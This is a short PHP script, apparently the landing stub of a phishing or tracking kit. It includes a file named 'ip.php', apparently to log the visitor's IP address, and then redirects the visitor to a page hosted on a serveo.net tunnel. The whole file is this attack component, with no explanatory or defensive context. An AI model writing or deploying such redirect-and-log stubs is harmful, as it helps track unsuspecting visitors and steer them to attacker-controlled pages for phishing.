<?php
include 'ip.php';
header('Location: https://pestis.serveo.net/index2.html');
exit
?>
